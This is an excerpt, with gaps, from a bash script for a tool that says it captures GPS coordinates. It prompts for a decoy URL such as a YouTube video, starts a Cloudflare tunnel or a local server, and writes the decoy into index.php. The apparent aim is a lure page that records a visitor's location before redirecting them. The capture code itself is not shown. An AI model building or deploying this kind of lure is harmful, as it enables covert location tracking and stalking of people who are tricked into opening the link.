...
banner() {
    clear
    printf "\e[1;90m This is a tool for information gathering and capturing GPS coordinates.\e[0m \n"
    printf "\n"
}
...
hound() {
    ...
    read -p $'\n\e[1;93m Enter the URL to redirect to (e.g., YouTube video URL): \e[0m' target_url
    ...
    if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
        cf_server
        sed -i 's+forwarding_link+'$target_url'+g' index.php
    else
        local_server
        sed -i 's+forwarding_link+'$target_url'+g' index.php
    fi
